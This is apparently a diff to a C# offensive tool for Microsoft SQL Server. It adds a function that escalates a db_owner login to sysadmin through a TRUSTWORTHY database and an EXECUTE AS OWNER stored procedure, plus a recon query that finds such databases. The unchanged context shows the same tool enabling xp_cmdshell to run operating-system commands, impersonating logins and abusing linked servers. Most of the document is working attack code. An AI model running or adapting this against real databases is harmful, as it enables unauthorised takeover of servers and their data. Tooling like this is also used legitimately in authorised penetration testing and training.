@@ -15,11 +15,53 @@ namespace SQLServerEx
             reader.Close();
         }
 
+        public static void DBownerEsc(SqlConnection con, String owneddb)
+        {
+            
+            String execCmd = "use " + owneddb + ";select db_name() as db,rp.name as database_role, mp.name as database_user from[" + owneddb + "].sys.database_role_members drm join[" + owneddb + "].sys.database_principals rp on(drm.role_principal_id = rp.principal_id) join[" + owneddb + "].sys.database_principals mp on(drm.member_principal_id = mp.principal_id) where rp.name = 'db_owner' and mp.name NOT IN('dbo')";
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+            while (reader.Read())
+            {
+                Console.WriteLine("[+] User has a dbowner role on: " + reader[0]);
+            }
+            reader.Close();
+
+            Console.WriteLine("Attempting to get a sysadmin role for the user");
+
+            String querylogin = "SELECT SYSTEM_USER;";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            String username = reader[0].ToString();
+            reader.Close();
+
+            execCmd = "CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '" + username + "','sysadmin'";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            execCmd = "EXEC sp_elevate;SELECT is_srvrolemember('sysadmin')";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Int32 role = Int32.Parse(reader[0].ToString());
+            if (role == 1)
+            {
+                Console.WriteLine("[+] User is now a sysadmin");
+            }
+            else
+            {
+                Console.WriteLine("[-] Escalation failed");
+            }
+            reader.Close();
+        }
+
         public static void Xp_cmdshell(SqlConnection con, String impersUser)
         {
             Impersonate(con, impersUser);
 
-            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
+            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
             String execCmd = "EXEC xp_cmdshell whoami";
 
             SqlCommand command = new SqlCommand(enable_xpcmd, con);
@@ -29,7 +71,7 @@ namespace SQLServerEx
             command = new SqlCommand(execCmd, con);
             reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("Result of command is: " + reader[0]);
+            Console.WriteLine("[+] Result of command is: " + reader[0]);
             reader.Close();
         }
 
@@ -87,7 +129,7 @@ namespace SQLServerEx
             command = new SqlCommand(execCmd, con);
             reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("Result of command is: " + reader[0]);
+            Console.WriteLine("[+] Result of command is: " + reader[0]);
             reader.Close();
 
             command = new SqlCommand(dropproc, con);
@@ -132,7 +174,7 @@ namespace SQLServerEx
             reader = command.ExecuteReader();
             while (reader.Read())
             {
-                Console.WriteLine("Linked SQL servers on Linked Server: " + reader[0]);
+                Console.WriteLine("[+] Linked SQL server on Linked Server: " + reader[0]);
             }
             reader.Close();
 
@@ -171,7 +213,7 @@ namespace SQLServerEx
             Int32 role = Int32.Parse(reader[0].ToString());
             if (role == 1)
             {
-                Console.WriteLine("User is a member of public role");
+                Console.WriteLine("[+] User is a member of public role");
             }
             else
             {
@@ -190,7 +232,7 @@ namespace SQLServerEx
             }
             else
             {
-                Console.WriteLine("User is NOT a member of sysadmin role");
+                Console.WriteLine("[-] User is NOT a member of sysadmin role");
             }
             reader.Close();
 
@@ -200,7 +242,7 @@ namespace SQLServerEx
             SqlDataReader reader_i = command_i.ExecuteReader();
             while (reader_i.Read() == true)
             {
-                Console.WriteLine("Logins that can be impersonated: " + reader_i[0]);
+                Console.WriteLine("[+] Logins that can be impersonated: " + reader_i[0]);
             }
             reader_i.Close();
 
@@ -210,7 +252,16 @@ namespace SQLServerEx
             reader = command.ExecuteReader();
             while (reader.Read())
             {
-                Console.WriteLine("Linked SQL server: " + reader[0]);
+                Console.WriteLine("[+] Linked SQL server: " + reader[0]);
+            }
+            reader.Close();
+
+            execCmd = "SELECT d.name AS DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN('MSDB') and r.type = 'R' and r.name = N'sysadmin'";
+            command = new SqlCommand(execCmd, con);
+            reader = command.ExecuteReader();
+            while (reader.Read())
+            {
+                Console.WriteLine("[+] Trusted databases owned by sysadmins: " + reader[0]);
             }
             reader.Close();
         }
@@ -231,6 +282,7 @@ namespace SQLServerEx
             string linkSrv = a.GetValue("l", "link");
             string impersUser = a.GetValue("i", "impers");
             string exploit = a.GetValue("e", "exploit");
+            string owneddb = a.GetValue("o", "odb");
 
             if (string.IsNullOrWhiteSpace(sqlServer))
                 sqlServer = Program.Prompt("sqlServer");
@@ -244,6 +296,7 @@ namespace SQLServerEx
             {
                 database = "master";
             }
+
 
             String conString = "";
 
@@ -282,7 +335,7 @@ namespace SQLServerEx
             }
 
             Recon(con);
-
+            
             if (string.IsNullOrWhiteSpace(impersUser))
             {
                 impersUser = "sa";
@@ -293,6 +346,10 @@ namespace SQLServerEx
 
                 switch (exploit)
                 {
+                    case "escalate":
+                        DBownerEsc(con, owneddb);
+                        break;
+
                     case "link":
                         // Requires -l to be set to target linked server
 
@@ -306,7 +363,7 @@ namespace SQLServerEx
                         break;
 
                     case "sp":
-                        // Provide the user to impersonate, otherwise will try sa. FIX the payloads.
+                        // Provide the user to impersonate, otherwise will try sa.
 
                         sp_OACreate(con, impersUser);
                         break;
